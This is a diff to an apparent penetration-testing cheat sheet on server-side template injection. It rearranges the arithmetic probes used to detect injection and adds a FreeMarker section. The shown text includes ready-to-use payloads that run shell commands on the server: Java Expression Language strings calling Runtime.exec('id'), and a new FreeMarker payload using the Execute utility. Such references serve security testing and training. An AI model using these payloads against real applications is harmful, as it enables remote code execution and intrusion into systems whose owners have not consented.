@@ -599,14 +599,16 @@ ERB(Ruby)
   
 <%= 7*7 %>
 
--> Others
+FreeMarker
   
+#{3*3}
+
+-> Others 
+    
 ${3*3}
   
 ${{3*3}}
-  
-#{3*3}
-  
+
 3*3
 
 ### Java Expression Language
@@ -614,7 +616,11 @@ ${{3*3}}
 {{T(java.lang.Runtime).getRuntime().exec('id')}}
 
 ''.class.forName('java.lang.Runtime').getRuntime().exec('id')
-  
+
+### FreeMarker
+
+\<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+
 ### Doc for SSTI	
 
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
